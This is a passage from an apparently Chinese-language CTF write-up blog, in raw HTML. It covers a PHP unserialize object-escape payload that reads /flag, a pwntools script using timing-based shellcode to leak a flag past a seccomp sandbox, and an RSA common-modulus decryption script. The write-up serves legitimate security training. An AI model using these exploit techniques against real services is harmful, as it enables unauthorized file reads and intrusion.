class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line">$myFile = <span class="keyword">new</span> File($data[<span class="string">&#x27;user&#x27;</span>], $data[<span class="string">&#x27;pass&#x27;</span>], $data[<span class="string">&#x27;repass&#x27;</span>], $data[<span class="string">&#x27;dir&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/flag|\.\.|\/|index|config/i&#x27;</span>, $dir)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;NO Hacker !!!!!!!!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$myFile = <span class="keyword">new</span> File($data[<span class="string">&#x27;user&#x27;</span>], $data[<span class="string">&#x27;pass&#x27;</span>], $data[<span class="string">&#x27;repass&#x27;</span>], $data[<span class="string">&#x27;dir&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析源代码 发现可以利用 <code>echo($this-&gt;dir);</code> 读取 flag</p><p>而 <code> if (preg_match(&#39;/flag|\.\.|\/|index|config/i&#39;, $dir))</code> 过滤了<code> //</code> <code>  ..</code> <code> /</code>  <code> index</code>  <code>/flag </code> <code> config</code></p><p>本地测试代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;file-reading&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">  &lt;form method&#x3D;&quot;GET&quot;&gt;</span><br><span class="line">    username&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;user&quot;&gt;</span><br><span class="line">    password&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;pass&quot;&gt;</span><br><span class="line">    repassword&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;repass&quot;&gt;</span><br><span class="line">    filename&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;dir&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">  &lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt; </span><br><span class="line">only admin can view &#x2F;flag</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class File &#123;</span><br><span class="line"></span><br><span class="line">    public $user;</span><br><span class="line">    public $pass;</span><br><span class="line">    public $repass;</span><br><span class="line">    public $dir;</span><br><span class="line"></span><br><span class="line">    function __construct($data1, $data2, $data3, $data4)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;user &#x3D; $data1;</span><br><span class="line">        $this-&gt;pass &#x3D; $data2;</span><br><span class="line">        $this-&gt;repass &#x3D; $data3;</span><br><span class="line">        $this-&gt;dir &#x3D; $data4;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function Login()</span><br><span class="line">    &#123;</span><br><span class="line">      if (($this-&gt;user &#x3D;&#x3D; &#39;ohhhh&#39; &amp;&amp; $this-&gt;pass &#x3D;&#x3D; &#39;a3333&#39;) || ($this-&gt;user &#x3D;&#x3D; &#39;admin&#39; &amp;&amp; $this-&gt;pass &#x3D;&#x3D; &#39;admin888&#39;)) &#123;</span><br><span class="line">      &#x2F;&#x2F;先登录</span><br><span class="line">        return true;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        return false;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">      if ($this-&gt;Login()) &#123;</span><br><span class="line">        echo($this-&gt;dir);</span><br><span class="line">      &#x2F;&#x2F; 利用这个读取</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        die(&#39;wrong user or pass&#39;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function filter($data)&#123;</span><br><span class="line">    if ($_SERVER[&#39;REMOTE_ADDR&#39;] &#x3D;&#x3D; &#39;127.0.0.1&#39;) &#123;</span><br><span class="line">        return $data;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $filter_arr &#x3D; array(&#39;admin&#39;,&#39;test&#39;,&#39;root&#39;);</span><br><span class="line">        $filter &#x3D; &#39;&#x2F;&#39;.implode(&#39;|&#39;,$filter_arr).&#39;&#x2F;i&#39;;</span><br><span class="line">    &#x2F;&#x2F; $filter &#x3D; &#x2F;admin|test|root&#x2F;i</span><br><span class="line">        return preg_replace($filter,&#39;hacker&#39;,$data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">if (isset($_GET[&#39;user&#39;]) &amp;&amp; isset($_GET[&#39;pass&#39;]) &amp;&amp; isset($_GET[&#39;repass&#39;]) &amp;&amp; isset($_GET[&#39;dir&#39;])) &#123;</span><br><span class="line">    $user &#x3D; $_GET[&#39;user&#39;];</span><br><span class="line">    $pass &#x3D; $_GET[&#39;pass&#39;];</span><br><span class="line">    $repass &#x3D; $_GET[&#39;repass&#39;];</span><br><span class="line">    $dir &#x3D; $_GET[&#39;dir&#39;];</span><br><span class="line">  &#x2F;&#x2F; 这里可以获取一个假的dir</span><br><span class="line">  print(&quot;2&quot;);</span><br><span class="line">  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    $get &#x3D; filter(serialize($_GET));</span><br><span class="line">  </span><br><span class="line">  echo serialize($_GET);</span><br><span class="line">  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">  echo $get;</span><br><span class="line">  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">  var_dump(unserialize($get));</span><br><span class="line">  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">  $data &#x3D; unserialize($get);</span><br><span class="line">  var_dump($data);</span><br><span class="line">  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    die(&#39;hello world&#39;);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; 这一步需要每个参数都有值</span><br><span class="line">&#x2F;&#x2F; 猜测可能有反序列化对象逃逸</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$data &#x3D; unserialize($get);</span><br><span class="line">if ($_SERVER[&#39;REMOTE_ADDR&#39;] &#x3D;&#x3D; &#39;127.0.0.1&#39;) &#123;</span><br><span class="line">  $myFile &#x3D; new File($data[&#39;user&#39;], $data[&#39;pass&#39;], $data[&#39;repass&#39;], $data[&#39;dir&#39;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line"></span><br><span class="line">  echo $dir;</span><br><span class="line">  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">  if (preg_match(&#39;&#x2F;flag|\.\.|\&#x2F;|index|config&#x2F;i&#39;, $dir)) &#123;</span><br><span class="line">      die(&#39;NO Hacker !!!!!!!!&#39;);</span><br><span class="line">  &#125;</span><br><span class="line">  $myFile &#x3D; new File($data[&#39;user&#39;], $data[&#39;pass&#39;], $data[&#39;repass&#39;], $data[&#39;dir&#39;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为是序列化之后才过滤的 然后反序列化 这里可以反序列化对象逃逸</p><p>后面检测输入dir是在过滤之前给的 所以可以造一个假的$dir=1</p><p>构造 payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user&#x3D;ohhhh&amp;pass&#x3D;a3333&amp;repass&#x3D;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:3:&quot;dir&quot;;s:5:&quot;&#x2F;flag&quot;;&#125;&amp;dir&#x3D;2</span><br></pre></td></tr></table></figure><h2 id="flag值"><a href="#flag值" class="headerlink" title="flag值"></a>flag值</h2><p><strong>flag{a5b689bf-3549-4b13-afde-3be026075faf}</strong></p><h1 id="0x04-slient"><a href="#0x04-slient" class="headerlink" title="0x04 slient"></a>0x04 slient</h1><h2 id="操作内容-3"><a href="#操作内容-3" class="headerlink" title="操作内容"></a>操作内容</h2><p>打开题目</p><p> 沙盒逃逸 存在seccomp 限制</p><p>查看</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201219194747.png" alt="image-20201219194747172"></p><p>程序可输入的shellcode执行</p><p>有read open 可用 </p><p>思路 ：</p><p>打开文件 猜测目标文件在./flag下</p><p>由于mmap申请地址在0x10000处  </p><p>填充后通过 <strong>pop rsi; shr esi,12;</strong> 复位</p><p>按位比较爆破出读出 flag 内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file = context.binary = <span class="string">&#x27;./chall&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>(<span class="params">p, index, ch</span>):</span></span><br><span class="line">    shellcode = <span class="string">&quot;push 0x10032aaa; pop rdi; shr edi, 12; xor esi, esi; push 2; pop rax; syscall;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># re open, rax =&gt; 4</span></span><br><span class="line">    shellcode += <span class="string">&quot;push 2; pop rax; syscall;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># read(rax, 0x10040, 0x50)</span></span><br><span class="line">    shellcode += <span class="string">&quot;mov rdi, rax; xor eax, eax; push 0x50; pop rdx; push 0x10040aaa; pop rsi; shr esi, 12; syscall;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> index == <span class="number">0</span>:</span><br><span class="line">        shellcode += <span class="string">&quot;cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-3; ret&quot;</span>.format(index, ch)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        shellcode += <span class="string">&quot;cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-4; ret&quot;</span>.format(index, ch)</span><br><span class="line"></span><br><span class="line">    shellcode = asm(shellcode)</span><br><span class="line">    <span class="comment"># print(len(shellcode))</span></span><br><span class="line">    p.sendafter(<span class="string">&quot;Welcome to silent execution-box.\n&quot;</span>, shellcode.ljust(<span class="number">0x40</span><span class="number">-14</span>, <span class="string">b&#x27;a&#x27;</span>) + <span class="string">b&#x27;./flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line">a = []</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> range(<span class="number">0x20</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="comment"># p = remote(&#x27;8.131.246.36&#x27;, &#x27;40334&#x27;)</span></span><br><span class="line">        p=process(file)</span><br><span class="line">        pwn(p, index, ch)</span><br><span class="line">        start = time.time()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p.recv(timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        end = time.time()</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">if</span> end-start &gt; <span class="number">1.5</span>:</span><br><span class="line">            a.append(ch)</span><br><span class="line">            print(<span class="string">&quot;&quot;</span>.join([chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> a]))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;&quot;</span>.join([chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> a]))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    index = index + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join([chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> a]))</span><br></pre></td></tr></table></figure><p>得到结果</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201219194856.png" alt="image-20201219194856719"></p><h2 id="flag-值-2"><a href="#flag-值-2" class="headerlink" title="flag 值"></a>flag 值</h2><p><strong>flag{k33p_qu14t!}</strong></p><h1 id="0x05-common-modulus"><a href="#0x05-common-modulus" class="headerlink" title="0x05 common_modulus"></a>0x05 common_modulus</h1><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>下载题目附件</p><p>task.py 内容如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG,HINT</span><br><span class="line"><span class="keyword">assert</span> len(HINT) &lt; len(FLAG)</span><br><span class="line"><span class="keyword">assert</span> len(FLAG) == <span class="number">38</span></span><br><span class="line"></span><br><span class="line">p1 = getPrime(<span class="number">2048</span>)</span><br><span class="line">q1 = getPrime(<span class="number">2048</span>)</span><br><span class="line">n1 = p1*q1</span><br><span class="line">e1 = <span class="number">321959</span></span><br><span class="line">e2 = <span class="number">250261</span></span><br><span class="line">c1 = pow(bytes_to_long(HINT),e1,n1)</span><br><span class="line">c2 = pow(bytes_to_long(HINT),e2,n1)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;n1=&#123;&#125;&#x27;</span>.format(n1))</span><br><span class="line">print(<span class="string">&#x27;c1=&#123;&#125;&#x27;</span>.format(c1))</span><br><span class="line">print(<span class="string">&#x27;c2=&#123;&#125;&#x27;</span>.format(c2))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p2 = getPrime(<span class="number">2048</span>)</span><br><span class="line">q2 = getPrime(<span class="number">2048</span>)</span><br><span class="line">n2 = p2*q2</span><br><span class="line">e3 = <span class="comment">#e3 in hint</span></span><br><span class="line">e4 = <span class="comment">#e4 in hint</span></span><br><span class="line"></span><br><span class="line">flag = bytes_to_long(FLAG)*bytes_to_long(HINT)</span><br><span class="line">c3 = pow(flag,e3,n2)</span><br><span class="line">c4 = pow(flag,e4,n2)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;n2=&#123;&#125;&#x27;</span>.format(n2))</span><br><span class="line">print(<span class="string">&#x27;c3=&#123;&#125;&#x27;</span>.format(c3))</span><br><span class="line">print(<span class="string">&#x27;c4=&#123;&#125;&#x27;</span>.format(c4))</span><br></pre></td></tr></table></figure><p>题目名字提示了是 RSA 共模攻击 </p><p>解题脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s,s2n</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a,n</span>):</span></span><br><span class="line">    x=<span class="number">0</span></span><br><span class="line">    old_x=<span class="number">1</span></span><br><span class="line">    y=<span class="number">1</span></span><br><span class="line">    old_y=<span class="number">0</span></span><br><span class="line">    r=n</span><br><span class="line">    old_r=a</span><br><span class="line">    <span class="keyword">while</span>(<span class="keyword">not</span> r==<span class="number">0</span>):</span><br><span class="line">        q=old_r//r</span><br><span class="line">        t=r</span><br><span class="line">        r=old_r-q*t</span><br><span class="line">        old_r=t</span><br><span class="line">        u=x</span><br><span class="line">        x=old_x-q*u</span><br><span class="line">        old_x=u</span><br><span class="line">        v=y</span><br><span class="line">        y=old_y-q*v</span><br><span class="line">        old_y=v</span><br><span class="line">    <span class="keyword">return</span> [old_r,old_x,old_y]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">common_m</span>(<span class="params">n,c1,c2,e1,e2</span>):</span></span><br><span class="line">    print(len(bin(n)))</span><br><span class="line">    s = egcd(e1, e2)</span><br><span class="line">    print(s)</span><br><span class="line">    s1 = s[<span class="number">1</span>]</span><br><span class="line">    s2 = s[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> s1 &lt;<span class="number">0</span>:</span><br><span class="line">        s1 = -s1</span><br><span class="line">        c1 = invert(c1,n)</span><br><span class="line">    <span class="keyword">if</span> s2 &lt;<span class="number">0</span>:</span><br><span class="line">        s2 = -s2</span><br><span class="line">        c2 = invert(c2, n)</span><br><span class="line">    m = pow(c1,s1,n)*pow(c2,s2,n) % n</span><br><span class="line">    <span class="keyword">return</span> m,s[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">low_e_attack</span>(<span class="params">e,m,n</span>):</span></span><br><span class="line">    l=<span class="number">0</span></span><br><span class="line">    t=n</span><br><span class="line">    ret = <span class="number">-1</span></span><br><span class="line">    <span class="keyword">while</span>(l&lt;=t):</span><br><span class="line">        mid = (l+t)//<span class="number">2</span></span><br><span class="line">        tem = mid**e</span><br><span class="line">        <span class="keyword">if</span>(tem == m):</span><br><span class="line">            print(mid)</span><br><span class="line">            ret = mid</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> tem&lt;m:</span><br><span class="line">                l=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> tem&gt;m:</span><br><span class="line">            t=mid<span class="number">-1</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    n = <span class="number">781036391323974008856551441504551844841173384369055361767143425092387727015642055181741701170017399241497120632344953499820518820132068694764700867696829033106666055030180813062993649803797649124562825632340854157269454042167398954816966758408050707394510052574354703514670567409229754892812751190528559839163370996270173354192391025119212070374345175232268160015709412770236244184407603397493657886160301984598114022346065772036916080039069065703045460825584095559014098364274915486192890077441915702648662247422573607141301387160468708901332801070000950051880674436952646199048944681743156311156561347137284309444428161898926050856612636204505753959646608899803680618195914959490447723147711810217755931778569656715879355497741337867486596084617334222360877256151925248867366886699774397369843538784086757551124956184373578870266105742924242667575610284091444010308038579594247922368368398449676635147254244680714381600463229849534333608407292776731721661271718860696451810720187133868564530559847589151122364073467586981976649022363672800597675920485113168688814933825793827901051904388778126030212255351752567066602576348655685594872269975311829268026394327948942096118152848379484736487085060738082253125862183108996724624059293</span></span><br><span class="line">    c1 = <span class="number">369574840235539108372094092254419274246554984982221252273253594183836400022960378170488757871945636102709146100003103420983393418895920944769809509498534206740321414394214836818668536994868508542980403916810808297197199669370712797146359430162012897117686984913530312098913792383741034334686281360853026726954824577914039860820382688425141138202072956110821496285690037742234810972548140439615644523558778763893381916419169521655893103187028705326557465586164413430726626576639348603638806511311706975958593200898505048876740706947195874397909272772688774998312506679360257618176951770041342256209410863260884750487279961933541672586237719402972217492287549068766414410155714303648473676009661943965293501994978200745219593293552499364219563185093112256120550663818918964081980469288619926291250638450874316053326601032273087039376723415701554676257043515877013761681843885375325430297941942692679848107999743068109805325264735576658206199089491608087442001508062053843516431089207243339447049547611183815785864081653492970812961076181422434762137310522146572918571492263273382927468586853431581811297567337244729976259333642991615934568219783998183005087012034016783535060297367475598352120058322912068079704771685886066199702963018</span></span><br><span class="line">    c2 = <span class="number">401003748149510002818767369230254602513865159661339906800347290711690807270702301230624025422831311596632795141531720435002853738573163182312453127686259756779068482529257900103967550779067445990067902733048774414790636519587265122992946230937925359967091172504901407334687520803755214564929157748817222608867504984640435317237940989728715980606596332309938083583162432506373976839198105889860716728175207628676903581344807944755695848151190623498753010294323617338270060040423742010145259129678264662465355879341730120526032229944482388360258216424682694404263498956947130580056839592840962191604893632645585505577517647817952448510353267629549246776809657021963707309740084072731429860522801140021375078140454523473108229522456529438036963702296406101462856177037427008765522302625128434931680973911239443952409966616788095217782552153170772137807287594897681855045237814736536800205438589010668545647972935172419082314572196606656703628418159952436419223060565888253991481370307426542468001783829259332035534414470988788183383528642038979811899061182916422795902465788443785184461640800074642736248613386467596765647696764766509793194318458994279346191732415463226129676210488158303216826287374744132977258018064709541279591219801</span></span><br><span class="line">    e1 = <span class="number">321959</span></span><br><span class="line">    e2 = <span class="number">250261</span></span><br><span class="line">    m1,g = common_m(n,c1,c2,e1,e2)</span><br><span class="line">    m1 = low_e_attack(g,m1,n)</span><br><span class="line">    print(n2s(m1))</span><br><span class="line">    n2 = <span class="number">829153922415855137264800234822397159517330834702889033537933377293887344320377111020468975059392957737449202237724182178497515850669969287557171761512943313347002707881627665997773538338624697031113180118787578098839812766590356161880633390491240275263405375614880514319024910802488825931065452764114707860207310201420715597319258880485040522551832971592910421789656655281398336391483665797851843030704262677198876702546809063670714197016598069553974073602743894202215033991282795559558580509644985355582265309273819085165244990507821708921430055578522701525123887916901778357465509369586730929688392667732886906857430517653096398002777964560127268121571049233223372798710275104635615146227690965482270801899538594859206469480776522613028131598888508457709453379574742196454867003503347438618445660900423827776062276496733498823286497376761412579384984369308185260156963156405659950843672893896087650002269874800953868406307954077672988900057904666430054296760155287271561170025767624003816826720442668295925485637633877652749338842612472516105683964067019360513619412986301224461318521372012905629559424109846511589009550745828509068711532135188012958609344134355466641890243263881890822508445307982892951553198862583429368670057993</span></span><br><span class="line">    c3 = <span class="number">159724515943626607063077852180725785535830882720862727668525327462548399711146109134244815376287134761817075519820142556357574606798840233562248755971526219627762223734393473798914901143269449212790392600105330383090174083139586064181174009077350924651070244802047181675971743583126005374180803661344948105563731243622231745397860438110568700027808240466520775159603948893458839584686022713865445974999010633338992077036339635470928309825709158252021736998333181626196852117911063143924690274341118934263954401171980866857766803251097624531349328131906037324939822709718110584612723905396082816423636920021116198893529151233844741049768382997165306708386377461537659894631638669541135139772256724755879894163220385702448163577861050255922091076291360733371557008202704744025308442559929057280944151904346146363641694256384699833066941693911888313063101709464779564216471784300409758667075242519216711038178970244130709075948085377075896223268673956328949049096893114349123857314470200317354442002350914580896785644057370606138149403529271049952702755513806243257608741081761103014849775297798769123025294190124352059867893341310583345698551198662911063194743695473937982189580136904500546179872911907699655901666991491654421172959264</span></span><br><span class="line">    c4 = <span class="number">577539997913679548128771306860581210544436789252901226997329423745523775309125445697836728285902404228772238261978792894724035857571722732772392975266650638941506233731097966088599219553016910895407298319171601788682316820727521975802034842881641332176636880671926669677709251368489592049188264858974171362799051918792714121517422464840766220636795897542591062529334135365684855298036787805819982776703613397951208027499626161971540340384357517350954755917853981444696889490414620688922414306470663625107920255478295871212500731262906706677230231273773081082937699900897018507666959617262265778895830665231960626623936539619558323350031200046331865204833002387826480300556398975518044660453862186191885052104669182124205562629260585502282489936369132703221625792917684714281278526690498041768698231671538540231217204457920089132127615505206718241082416584911313565380784068494321438301994932115301961956898936006101799945175006847294491423172988371831199816110394796146842726192613950900507852084712888550397657990358471172662866403096061418272111461743199683739447289005311734544421847876133462236161463005728810728422873087670552019575195179400831748068699257581271088746550021722434317091260496556373742562805426688588980981788900</span></span><br><span class="line"></span><br><span class="line">    e3=<span class="number">386321</span></span><br><span class="line">    e4=<span class="number">216437</span> </span><br><span class="line">    m2,g = common_m(n2,c3,c4,e3,e4)</span><br><span class="line">    m2 = gmpy2.mpz(m2)</span><br><span class="line">    m1 = gmpy2.mpz(m1)</span><br><span class="line">    m2 = (m2* invert(pow(m1,g,n2),n2))%n2</span><br><span class="line">    m2 = 